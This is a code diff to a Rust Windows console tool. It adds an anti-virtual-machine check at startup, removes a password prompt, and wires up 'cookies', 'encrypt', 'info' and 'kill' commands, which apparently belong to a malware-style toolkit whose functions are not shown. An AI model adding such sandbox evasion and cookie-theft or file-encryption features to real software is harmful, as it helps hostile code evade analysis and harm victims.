@@ -5,11 +5,14 @@ use std::ffi::OsStr;
 use std::os::windows::ffi::OsStrExt;
 use winapi::um::wincon::SetConsoleTitleW;
 use colored::*;
-use std::{time::Duration};
 
 mod functions;
+mod antivm;
 
 fn main() -> io::Result<()> {
+    // Check if the program is running in a VM
+    antivm::kill();
+    
     ansi_term::enable_ansi_support().unwrap();
 
     // Clear the command prompt
@@ -40,65 +43,8 @@ fn main() -> io::Result<()> {
         "",
     ];
 
-    let access_denied = [
-        "    /$$$$$$                                                                         /$$    ",
-        "   |_  $$_/                                                                        | $$    ",
-        "     | $$   /$$$$$$$   /$$$$$$$  /$$$$$$   /$$$$$$   /$$$$$$   /$$$$$$   /$$$$$$$ /$$$$$$  ",
-        "     | $$  | $$__  $$ /$$_____/ /$$__  $$ /$$__  $$ /$$__  $$ /$$__  $$ /$$_____/|_  $$_/  ",
-        "     | $$  | $$  \\ $$| $$      | $$  \\ $$| $$  \\__/| $$  \\__/| $$$$$$$$| $$        | $$    ",
-        "     | $$  | $$  | $$| $$      | $$  | $$| $$      | $$      | $$_____/| $$        | $$ /$$",
-        "    /$$$$$$| $$  | $$|  $$$$$$$|  $$$$$$/| $$      | $$      |  $$$$$$$|  $$$$$$$  |  $$$$/",
-        "   |______/|__/  |__/ \\_______/ \\______/ |__/      |__/       \\_______/ \\_______/   \\___/  ",
-        "",
-    ];
-
-    let access_granted = [
-        "     /$$$$$$                                                      /$$    ",
-        "    /$$__  $$                                                    | $$    ",
-        "   | $$  \\__/  /$$$$$$   /$$$$$$   /$$$$$$   /$$$$$$   /$$$$$$$ /$$$$$$  ",
-        "   | $$       /$$__  $$ /$$__  $$ /$$__  $$ /$$__  $$ /$$_____/|_  $$_/  ",
-        "   | $$      | $$  \\ $$| $$  \\__/| $$  \\__/| $$$$$$$$| $$        | $$    ",
-        "   | $$    $$| $$  | $$| $$      | $$      | $$_____/| $$        | $$ /$$",
-        "   |  $$$$$$/|  $$$$$$/| $$      | $$      |  $$$$$$$|  $$$$$$$  |  $$$$/",
-        "    \\______/  \\______/ |__/      |__/       \\_______/ \\_______/   \\___/  ",
-        "",
-    ];
-
     for line in &lines {
         println!("{}", line.truecolor(80, 12, 170));
-    }
-
-    let password = "1337";
-
-
-    print!("    Please enter the password: ");
-    io::stdout().flush()?;
-
-    let mut user_input = String::new();
-    std::io::stdin()
-        .read_line(&mut user_input)
-        .expect("        Failed to read line");
-
-    if user_input.trim() == password {
-        print!("{}[2J", 27 as char);
-        stdout().flush().unwrap();
-        for line in &access_granted {
-            println!("{}", line.truecolor(57, 255, 20));
-        }
-        std::thread::sleep(Duration::new(1, 0));
-        print!("{}[2J", 27 as char);
-        stdout().flush().unwrap();
-        for line in &lines {
-            println!("{}", line.truecolor(80, 12, 170));
-        }
-    } else {
-        print!("{}[2J", 27 as char);
-        stdout().flush().unwrap();
-        for line in &access_denied {
-            println!("{}", line.truecolor(255, 0, 80));
-        }
-        std::thread::sleep(Duration::new(2, 0));
-        std::process::exit(0);
     }
 
     loop {
@@ -134,7 +80,7 @@ fn main() -> io::Result<()> {
                 print!("{}[2J", 27 as char);
                 stdout().flush().unwrap();
                 for line in &lines {
-                    println!("{}", line.truecolor(80, 0, 255));
+                    println!("{}", line.truecolor(80, 12, 170));
                 }
             }
             "find" => {
@@ -149,8 +95,17 @@ fn main() -> io::Result<()> {
             "cookies" => {
                 functions::cookies();
             }
+            "encrypt" | "enc" => {
+                functions::encrypt_file();
+            }
             "help" => {
                 functions::help();
+            }
+            "info" => {
+                functions::info();
+            }
+            "kill" => {
+                functions::kill();
             }
             _ => println!("{} Type '{}' for a list of commands.", "        Command not found.".truecolor(255, 0, 0), "help".truecolor(80, 0, 255)),
         }
